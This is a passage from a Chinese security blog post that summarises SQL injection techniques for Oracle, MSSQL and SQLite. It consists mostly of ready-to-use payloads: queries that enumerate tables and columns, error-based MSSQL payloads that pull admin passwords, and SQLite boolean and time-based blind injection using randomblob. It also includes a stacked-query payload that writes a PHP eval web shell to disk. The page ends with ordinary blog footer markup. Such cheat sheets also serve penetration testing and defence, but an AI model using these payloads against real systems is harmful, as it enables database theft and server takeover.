+<h6 id="获取表名："><a href="#获取表名：" class="headerlink" title="获取表名："></a>获取表名：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select table_name from user_tables where rownum=1，依次爆出所有表类似暴库。</span><br></pre></td></tr></table></figure>
+<h6 id="获取字段名："><a href="#获取字段名：" class="headerlink" title="获取字段名："></a>获取字段名：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select column_name from user_tab_columns where table_name=&apos;tablename&apos; and rownum=1，</span><br></pre></td></tr></table></figure>
+<p><br></p>
+<h3 id="2-MSSQL"><a href="#2-MSSQL" class="headerlink" title="2.MSSQL"></a>2.MSSQL</h3><h6 id="数据库版本："><a href="#数据库版本：" class="headerlink" title="数据库版本："></a>数据库版本：</h6><p><code>select @@VERSION</code></p>
+<h6 id="数据库名："><a href="#数据库名：" class="headerlink" title="数据库名："></a>数据库名：</h6><p><code>select db_name()</code></p>
+<h6 id="数据库ip地址："><a href="#数据库ip地址：" class="headerlink" title="数据库ip地址："></a>数据库ip地址：</h6><p><code>select local_net_address from sys.dm_exec_connextions where Session_id=@@spid</code></p>
+<h6 id="暴当前表中的列："><a href="#暴当前表中的列：" class="headerlink" title="暴当前表中的列："></a>暴当前表中的列：</h6><p><code>article.asp?id=6 group by admin.username having 1=1--</code></p>
+<p><code>article.asp?id=6 group by admin.username,admin.password having 1=1--</code></p>
+<h6 id="暴任意表和列："><a href="#暴任意表和列：" class="headerlink" title="暴任意表和列："></a>暴任意表和列：</h6><p><code>and (select top 1 name from (select top N id,name from sysobjects where xtype=char(85)) T order by id desc)&gt;1</code></p>
+<p><code>and (select top col_name(object_id(&#39;admin&#39;),N) from sysobjects)&gt;1</code></p>
+<h6 id="暴数据库数据："><a href="#暴数据库数据：" class="headerlink" title="暴数据库数据："></a>暴数据库数据：</h6><p><code>and (select top 1 password from admin where id=N)&gt;1</code></p>
+<p><br></p>
+<h3 id="3-SQLite"><a href="#3-SQLite" class="headerlink" title="3.SQLite"></a>3.SQLite</h3><h5 id="（1）常用信息及语句"><a href="#（1）常用信息及语句" class="headerlink" title="（1）常用信息及语句"></a>（1）常用信息及语句</h5><p>数据库版本：<br><code>select sqlite_version()</code></p>
+<p>获取所有表名：<br><code>SELECT name FROM sqlite_master WHERE type=&#39;table&#39;</code></p>
+<p>所有表结构(包含字段名，表名)：<br><code>SELECT sql FROM sqlite_master WHERE type=&#39;table&#39;</code></p>
+<p>注释符<br><code>--</code></p>
+<p>盲注常用函数：<code>substr()（没有mid、left等函数），判断长度函数length()</code></p>
+<h5 id="（2）BOOL盲注"><a href="#（2）BOOL盲注" class="headerlink" title="（2）BOOL盲注"></a>（2）BOOL盲注</h5><p>bool条件构造和MySQL一样，但是亦或运算的Payload不可用，注释符使用–。</p>
+<p>逻辑判断目前我就翻到一个substr()，应用实例：<br><code>cond=&#39;FALSE&#39; or (substr(&#39;abc&#39;,1,1)=&#39;a&#39;)</code></p>
+<h5 id="（3）延时盲注"><a href="#（3）延时盲注" class="headerlink" title="（3）延时盲注"></a>（3）延时盲注</h5><p>sqlite没有类似sleep()的函数，但有个函数randomblob(N)，生成N个任意字符，可以造成延时。</p>
+<p>SQLite没有if，可以使用case when … then …</p>
+<p>格式<code>cond=&#39;true&#39; AND 1=(case when (bool) then randomblob(100000000) else 0 end)</code><br>100000000个字符就有明显延时了。</p>
+<p>注意cond为真，并且不要有太多条数据，因为有一条数据就会执行一次<code>randomblob(100000000)</code>，如果数据很多的话，服务器直接挂了。可以首先判断一下数据量，再确定N的值，比如我这里有100多条数据，就可以<code>id=&#39;&#39; or 1 AND 1=randomblob(1000000)</code>这样，把N的值缩小100倍。灵活运用。</p>
+<p>运用实例：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos; or 1 and 1=(case when substr(&apos;abc&apos;,1,1)=&apos;a&apos; then randomblob(1000000) else 0 end)--</span><br></pre></td></tr></table></figure></p>
+<h5 id="（4）写文件"><a href="#（4）写文件" class="headerlink" title="（4）写文件"></a>（4）写文件</h5><p>需要直接访问数据库，或堆叠查询选项启用（默认关闭）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;;ATTACH DATABASE &apos;/tmp/p0.php&apos; AS p0;CREATE TABLE p0.shell (data text);INSERT INTO p0.shell (data) VALUES (&apos;&lt;?php eval($_POST[1]);?&gt;&apos;);--</span><br></pre></td></tr></table></figure></p>
+<p>root权限的话可以写计划任务和公钥，参考redis未授权访问利用。</p>
+<h5 id="（5）读文件"><a href="#（5）读文件" class="headerlink" title="（5）读文件"></a>（5）读文件</h5><p>只能用在Windows上，需要特殊配置。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load_extension(library_file,entry_point)</span><br></pre></td></tr></table></figure></p>
+
+                <hr>
+                <div>
+                    <p>
+                         
+                        <span class="badge badge-light">#&nbsp;SQL注入</span>
+                        &nbsp;
+                        
+                    </p>
+                </div>
+                <br>
+                
+                    <p class="note note-warning">原创文章，转载请注明出处！</p>
+                
+            </div>
+        </div>
+        <div class="d-none d-md-block col-md-2">
+            
+  <div id="toc" class="py-5">
+    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
+    <div id="tocbot"></div>
+  </div>
+
+        </div>
+    </div>        
+</div>
+
+<br><br><br>
+
+<!-- Comments -->
+<div class="comments" id="comments">
+
+    
+    <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>               
+        var disqus_shortname = '';
+        var disqus_config = function () {
+            this.page.url = 'https://lethe.site/2019/07/16/SQL注入总结/'; 
+            this.page.identifier = '/2019/07/16/SQL注入总结/';
+        };
+        (function() { 
+            var d = document, s = d.createElement('script');
+            s.type = 'text/javascript';
+            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+</div>
+ 
+</div>
+  
+  </main>
+
+<footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+  </div>
+</footer>
+
+  <!-- SCRIPTS -->
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
+  <script src="/js/main.js"></script>
+  
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    
+    <script src="/js/post.js"></script>
+    
+      <script src="/js/plugins/prettify.js"></script>
+      <script>
+          $(document).ready(function(){
+              $('pre').addClass('prettyprint linenums');
+              prettyPrint();
+          })
+      </script>
+    
+  
+</body>
+</html>
